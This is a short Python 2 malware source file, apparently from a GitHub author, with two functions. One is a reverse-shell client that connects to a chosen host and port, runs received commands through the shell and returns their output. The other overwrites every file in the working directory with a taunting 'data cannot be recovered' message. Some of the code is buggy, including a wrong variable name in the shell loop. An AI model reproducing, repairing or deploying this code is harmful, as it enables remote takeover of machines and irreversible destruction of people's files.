#!/usr/bin/python
'''
github.com/razyar
Notice:
    Run with __init__.py

"You can personally change the what Functions need to be on. go and change __init__.py if you want"

'''

import os
import sys
import subprocess
import socket
from socket import *
from subprocess import *


#Connection (you can get sh3l with this func)

def _0x2_client(host, port):
    _0x2Sock = socket(AF_INET, SOCK_STREAM) #Also (2,1)
    try:
        _0x2Sock.connect((host, int(port)))
        print 'Connection Established.'
        try:
            while True:
                _0x2data = _0x2Sock.recv(0x800)
                _0x2sh3l = subprocess.check_output(data, shell=True)
                _0x2Sock.sendall(_0x2sh3l)
            _0x2Sock.close()
        except Exception as sendingdata:
            print 'Error between Func [_0x2_client: while True-_0x2Sock.close()]\n More: %s' % sendingdata
    except Exception as FunctionError:
        print 'Error in Func [_0x2_client]\n More: %s' % FunctionError


#local

def _0x2local(execute=True):
    if execute == "True":
        _0x2cwd = os.getcwd()
        _0x2dir = os.listdir(os.getcwd())
        for _0x2localdata in _0x2dir:
            try:
                _0x2execute = open(_0x2localdata, 'w')
                _0x2execute.write('Notice:\n\t Data: cannot be recovery.\n\t Data: cannot be restore.\n\t Data: just for fun- 0x2 was here.')
                _0x2execute.close()
            except Exception as exe:
                print '[exe] error: %s' % exe
    else:
        print 'execute must be [True]'
        sys.exit(r'0')
